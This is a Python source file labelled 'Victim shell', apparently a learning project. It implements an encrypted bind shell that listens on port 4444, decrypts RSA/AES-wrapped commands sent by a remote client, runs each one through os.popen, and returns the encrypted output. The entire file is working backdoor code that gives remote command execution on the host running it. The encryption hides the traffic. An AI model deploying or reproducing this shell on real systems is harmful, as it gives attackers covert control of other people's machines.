#! /usr/bin/python3
# coding=utf-8

"""
Victim shell
"""

import socket
import os
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

def open_key():
    """
    function that load asimetric key
    """
    with open("id_rsa", encoding='utf8') as file:
        contents = file.read()
        private_key = RSA.import_key(contents)
    return private_key

def connect(new_socket):
    """
    function that establish the socket
    """
    try:
        host = "127.0.0.1"
        port = 4444
        new_socket.bind((host, port))
        new_socket.listen()
    except OSError:
        print("Port in use, Can't open port")

def decript(private_key_decript, enc_session_key, nonce_decrypt, tag, ciphertext):
    """
    function that decript data
    """

    # Decrypt the session key with the private RSA key
    cipher_rsa = PKCS1_OAEP.new(private_key_decript)
    session_key = cipher_rsa.decrypt(enc_session_key)

    # Decrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce_decrypt)
    data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    return data, session_key

def execute(data):
    """
    function that escecute command
    """
    cmd_output = os.popen(data.decode("utf-8")).read()
    cmd_output_bytes = cmd_output.encode("utf-8")
    return cmd_output_bytes

def encript(cmd_output_bytes, session_key, nonce):
    """
    function that encript data
    """
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
    ciphertext, tag = cipher_aes.encrypt_and_digest(cmd_output_bytes)
    return cipher_aes, ciphertext, tag

def get_data(connection, address):
    """
    function that get client command
    """
    print(f"Connected by {address}")
    for i in range(4):
        enc_data = connection.recv(10240)
        if enc_data != "":
            if i == 0:
                enc_session_key = enc_data
            elif i == 1:
                nonce = enc_data
            elif i == 2:
                tag = enc_data
            elif i == 3:
                ciphertext = enc_data
        elif not enc_data:
            break
    return enc_session_key,nonce,tag,ciphertext

def send_data(cipher_aes, tag, ciphertext, connection):
    """
    function that send data to client
    """
    for text in (cipher_aes.nonce, tag, ciphertext):
        connection.send(text)
        time.sleep(0.1)

def main():
    """
    Main program, connection and call other functions
    """
    private_key = open_key()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
        connect(new_socket)
        while True:
            try:
                connection, address = new_socket.accept()
                with connection:
                    # get data from server
                    enc_session_key,nonce,tag,ciphertext = get_data(connection, address)

                    # decript data and execute
                    data, session_key = decript(private_key,enc_session_key,nonce,tag,ciphertext)
                    cmd_output_bytes = execute(data)

                    # encript data and send
                    cipher_aes, ciphertext, tag = encript(cmd_output_bytes, session_key,nonce)
                    send_data(cipher_aes, tag, ciphertext, connection)
            except OSError:
                print("\n")
                break

if __name__ == "__main__":
    main()
